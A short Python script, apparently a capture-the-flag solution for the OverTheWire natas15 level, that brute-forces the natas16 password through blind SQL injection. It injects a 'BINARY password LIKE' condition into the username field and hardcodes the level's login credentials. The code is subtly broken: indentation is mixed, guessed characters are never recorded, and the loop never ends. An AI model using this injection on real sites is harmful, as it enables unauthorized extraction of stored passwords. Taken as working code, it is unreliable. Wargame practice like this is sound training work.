import requests
import re
from  string import *

characters = lowercase + digits + uppercase


username= "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

seen_password = list()
while ( True ):
	for ch in characters:
		print "trying with passord", "".join(seen_password) + ch

        response = session.post(url, data = {'username' : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" # '}, auth=(username,password))
        content = response.text
        print(content)